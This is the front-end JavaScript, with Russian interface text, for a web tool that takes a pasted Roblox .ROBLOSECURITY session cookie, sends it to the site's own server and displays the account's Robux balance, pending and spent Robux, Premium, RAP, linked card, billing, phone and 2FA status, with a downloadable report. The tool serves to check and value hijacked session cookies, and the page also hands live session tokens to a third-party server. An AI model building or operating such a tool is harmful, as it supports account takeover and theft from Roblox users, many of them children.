document.addEventListener('DOMContentLoaded', function() {
    // Проверяем поддержку браузером
    if (!window.Particles) {
        console.warn('Particles.js not loaded, using fallback animation');
        createFallbackAnimation();
    } else {
        particlesJS('particles-js', {
            particles: {
                number: { value: 60, density: { enable: true, value_area: 800 } },
                color: { value: "#ffffff" },
                shape: { type: "circle" },
                opacity: { value: 0.3, random: true },
                size: { value: 2, random: true },
                line_linked: {
                    enable: true,
                    distance: 120,
                    color: "#ffffff",
                    opacity: 0.1,
                    width: 0.5
                },
                move: {
                    enable: true,
                    speed: 1.5,
                    direction: "none",
                    random: true,
                    straight: false,
                    out_mode: "out"
                }
            },
            interactivity: {
                detect_on: "canvas",
                events: {
                    onhover: { enable: true, mode: "grab" },
                    onclick: { enable: true, mode: "push" },
                    resize: true
                }
            }
        });
    }

    function createFallbackAnimation() {
        const canvas = document.getElementById('particles-js');
        if (canvas) {
            canvas.innerHTML = '<div style="position:absolute;width:100%;height:100%;background:linear-gradient(45deg, rgba(102,126,234,0.3), rgba(118,75,162,0.3));animation: pulse 4s ease-in-out infinite;"></div>';
        }
    }

    const checkButton = document.getElementById('checkButton');
    const cookieInput = document.getElementById('cookieInput');
    const resultSection = document.getElementById('resultSection');
    const errorSection = document.getElementById('errorSection');

    if (checkButton && cookieInput) {
        checkButton.addEventListener('click', checkCookie);
        cookieInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                checkCookie();
            }
        });
    }

    async function checkCookie() {
        const cookie = cookieInput.value.trim();
        
        if (!cookie) {
            showError('Пожалуйста, введите куки');
            return;
        }

        if (!cookie.includes('ROBLOSECURITY')) {
            showError('Пожалуйста, введите корректный ROBLOSECURITY куки');
            return;
        }

        showLoading(true);
        hideResults();

        try {
            const response = await fetch('/api/check_cookie', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ cookie: cookie })
            });

            const result = await response.json();

            if (!response.ok) {
                throw new Error(result.error || 'HTTP error ' + response.status);
            }

            if (result.error) {
                showError(result.error);
            } else {
                displayResults(result);
            }
        } catch (error) {
            console.error('Check error:', error);
            showError('Ошибка соединения: ' + error.message);
        } finally {
            showLoading(false);
        }
    }

    function displayResults(data) {
        if (!data || typeof data !== 'object') {
            showError('Неверный формат данных');
            return;
        }

        try {
            // Основная информация
            const basicInfoEl = document.getElementById('basicInfo');
            if (basicInfoEl) {
                basicInfoEl.innerHTML = `
                    <div class="info-item">
                        <span>👤 Имя пользователя:</span>
                        <span>${escapeHtml(data.username || 'Неизвестно')}</span>
                    </div>
                    <div class="info-item">
                        <span>📛 Display Name:</span>
                        <span>${escapeHtml(data.display_name || 'N/A')}</span>
                    </div>
                    <div class="info-item">
                        <span>🆔 ID аккаунта:</span>
                        <span>${escapeHtml(data.account_id || 'Неизвестно')}</span>
                    </div>
                    <div class="info-item">
                        <span>📅 Возраст аккаунта:</span>
                        <span>${data.account_age_days || 0} дней</span>
                    </div>
                    <div class="info-item">
                        <span>🔗 Ссылка на профиль:</span>
                        <a href="${escapeHtml(data.profile_link || '#')}" target="_blank" style="color: #48dbfb;">Открыть</a>
                    </div>
                `;
            }

            // Безопасность
            const securityInfoEl = document.getElementById('securityInfo');
            if (securityInfoEl) {
                securityInfoEl.innerHTML = `
                    <div class="info-item">
                        <span>🛡️ 2FA:</span>
                        <span class="status ${data['2fa'] ? 'positive' : 'negative'}">
                            ${data['2fa'] ? '✅ Включено' : '❌ Выключено'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>📱 Телефон:</span>
                        <span class="status ${data.phone ? 'positive' : 'negative'}">
                            ${data.phone ? '✅ Привязан' : '❌ Не привязан'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>💳 Карта:</span>
                        <span class="status ${data.card ? 'positive' : 'negative'}">
                            ${data.card ? '✅ Привязана' : '❌ Не привязана'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>💰 Billing:</span>
                        <span class="status ${data.card ? 'positive' : 'negative'}">
                            ${data.card ? '✅ Доступен' : '❌ Не доступен'}
                        </span>
                    </div>
                `;
            }

            // Экономика
            const economyInfoEl = document.getElementById('economyInfo');
            if (economyInfoEl) {
                economyInfoEl.innerHTML = `
                    <div class="info-item">
                        <span>💎 Баланс Robux:</span>
                        <span style="color: #feca57; font-weight: bold;">${data.balance || 0}</span>
                    </div>
                    <div class="info-item">
                        <span>⏳ Pending Robux:</span>
                        <span>${data.pending_robux || 0}</span>
                    </div>
                    <div class="info-item">
                        <span>👑 Premium:</span>
                        <span class="status ${data.premium ? 'positive' : 'negative'}">
                            ${data.premium ? '✅ Активен' : '❌ Не активен'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>🎨 RAP:</span>
                        <span class="status ${data.rap ? 'positive' : 'negative'}">
                            ${data.rap ? '✅ Есть' : '❌ Нет'}
                        </span>
                    </div>
                    <div class="info-item">
                        <span>🏢 Group Pending:</span>
                        <span>${data.pending_group_robux || 0}</span>
                    </div>
                    <div class="info-item">
                        <span>💸 Всего потрачено:</span>
                        <span>${data.total_spent || 0} Robux</span>
                    </div>
                `;
            }

            // Настройка кнопки скачивания
            const downloadBtn = document.getElementById('downloadBtn');
            if (downloadBtn && data.check_id) {
                downloadBtn.onclick = () => {
                    window.location.href = `/download/${data.check_id}`;
                };
                downloadBtn.style.display = 'inline-block';
            }

            resultSection.classList.remove('hidden');
            errorSection.classList.add('hidden');

            // Плавная прокрутка к результатам
            resultSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });

        } catch (error) {
            console.error('Display error:', error);
            showError('Ошибка отображения результатов');
        }
    }

    function escapeHtml(unsafe) {
        if (typeof unsafe !== 'string') return unsafe;
        return unsafe
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function showError(message) {
        const errorMessageEl = document.getElementById('errorMessage');
        if (errorMessageEl) {
            errorMessageEl.textContent = message;
        }
        errorSection.classList.remove('hidden');
        resultSection.classList.add('hidden');
        
        if (errorSection) {
            errorSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
    }

    function hideResults() {
        resultSection.classList.add('hidden');
        errorSection.classList.add('hidden');
    }

    function showLoading(show) {
        if (!checkButton) return;
        
        const btnText = checkButton.querySelector('.btn-text');
        const loader = checkButton.querySelector('.btn-loader');
        
        if (show) {
            btnText.style.display = 'none';
            loader.style.display = 'block';
            checkButton.disabled = true;
            checkButton.style.opacity = '0.7';
        } else {
            btnText.style.display = 'block';
            loader.style.display = 'none';
            checkButton.disabled = false;
            checkButton.style.opacity = '1';
        }
    }

    // Добавляем CSS анимацию для fallback
    const style = document.createElement('style');
    style.textContent = `
        @keyframes pulse {
            0% { opacity: 0.3; }
            50% { opacity: 0.6; }
            100% { opacity: 0.3; }
        }
    `;
    document.head.appendChild(style);
});